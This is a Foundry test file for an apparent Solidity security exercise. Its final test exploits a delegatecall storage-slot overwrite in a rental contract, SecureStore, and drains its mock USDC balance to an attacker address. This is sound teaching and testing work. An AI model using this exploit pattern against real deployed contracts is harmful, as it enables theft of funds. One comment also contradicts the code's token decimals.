pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {usdcErc20} from "src/call-attacks/call-attacks-2/ERC20.sol";
import "../../../src/call-attacks/call-attacks-2/RentingLibrary.sol";
import {SecureStore} from "../../../src/call-attacks/call-attacks-2/SecureStore.sol";
import {ThisIsNothing} from "../../../src/call-attacks/call-attacks-2/ThisIsNothing.sol";

contract Call2Test is Test {
    // Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    RentingLibrary rentingLibrary;
    SecureStore secureStore;
    usdcErc20 usdc;
    address deployerAddress = address(100);
    address userAddress = address(101); //65
    address attacker = address(102);
    address USDC = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    // set constant price to 5 USDC; keep in mind that USDC has 6 decimals
    uint256 PRICE = 5 * 10 ** 18;
    uint256 USDC_AMOUNT = 10 * 10 ** 18;

    event RentedFor(uint256 numDays);

    function setUp() public {
        // impersonate deployerAddress since Secure has onlyOwner
        vm.startPrank(deployerAddress);
        // Setup instance of the contract
        rentingLibrary = new RentingLibrary();
        // deploy an instance of USDC token contract using our MockERC20
        usdc = new usdcErc20();
        // need usdc address so secureStore is last
        secureStore = new SecureStore(address(rentingLibrary),PRICE, address(usdc));
        vm.stopPrank();
        // deal secureStore some USDC so we can rob it
        deal(address(usdc), address(secureStore), PRICE);
        // Deal EOA address some USDC
        deal(address(usdc), deployerAddress, USDC_AMOUNT);
        deal(address(usdc), userAddress, USDC_AMOUNT);
        deal(address(usdc), attacker, PRICE);
        // Deal EOA address some ether
        deal(deployerAddress, 1 ether);
        deal(userAddress, 1 ether);
        deal(attacker, 1 ether);
    }

    function testUserRentWarehouse() public {
        // impersonate userAddress
        vm.startPrank(userAddress);
        // aprove SecureStore to spend USDC for max uint256
        usdc.approve(address(secureStore), type(uint256).max);
        uint256 contractUsdcBalance = usdc.balanceOf(address(secureStore));
        vm.expectEmit(false, false, false, true);
        emit RentedFor(USDC_AMOUNT / PRICE);
        secureStore.rentWarehouse(USDC_AMOUNT / PRICE, 1);
        vm.stopPrank();
        assertEq(usdc.balanceOf(address(secureStore)), USDC_AMOUNT + contractUsdcBalance);
    }

    function testDeployerRentWarehouse() public {
        // impersonate deployerAddress,
        vm.startPrank(deployerAddress);
        // aprove SecureStore to spend USDC for max uint256
        usdc.approve(address(secureStore), type(uint256).max);
        uint256 contractUsdcBalance = usdc.balanceOf(address(secureStore));
        secureStore.rentWarehouse(USDC_AMOUNT / PRICE, 2);
        vm.stopPrank();
        assertEq(usdc.balanceOf(address(secureStore)), USDC_AMOUNT + contractUsdcBalance);
    }

    // failing due to ERC20 allowance/balance
    function testFailUserRentWarehouse() public {
        // impersonate userAddress
        vm.startPrank(userAddress);
        // call rentWarehouse() which will attempt to transfer USDC before we aprove SecureStore to spend USDC for max uint256
        secureStore.rentWarehouse(USDC_AMOUNT / PRICE, 1);
        vm.stopPrank();
    }

    function testAttackerTerminateUserRental() public {
        testUserRentWarehouse();
        vm.startPrank(attacker);
        // will call terminateRental and expect it to revert with reason "Only current renter"
        vm.expectRevert("Only current renter");
        secureStore.terminateRental();
        vm.stopPrank();
    }

    function testAttackerRentwarehouseAndChangeSlot0() public {
        vm.startPrank(attacker);
        uint256 attackerStartingBal = usdc.balanceOf(attacker);
        uint256 secureStorStaringBal = usdc.balanceOf(address(secureStore));
        ThisIsNothing thisIsNothing = new ThisIsNothing(address(secureStore), address(usdc));
        uint256 addressToUint = uint160(address(thisIsNothing));
        // assembly {
        //     addressToUint := thisIsNothing
        // }
        // uint256 addressToUint = uint256(address(thisIsNothing));
        usdc.approve(address(secureStore), type(uint256).max);
        secureStore.rentWarehouse(1, addressToUint);
        // 2 days == 172800 seconds
        skip(172810);
        vm.expectEmit(false, false, false, true);
        emit RentedFor(0);
        secureStore.rentWarehouse(0, uint256(uint160(address(attacker))));
        secureStore.withdrawAll();
        vm.stopPrank();
        emit log_named_uint("Attacker", usdc.balanceOf(attacker));
        emit log_named_uint("Bank", usdc.balanceOf(address(secureStore)));
        assertEq(usdc.balanceOf(address(secureStore)), 0);
        assertEq(usdc.balanceOf(attacker), attackerStartingBal + secureStorStaringBal);
    }
}
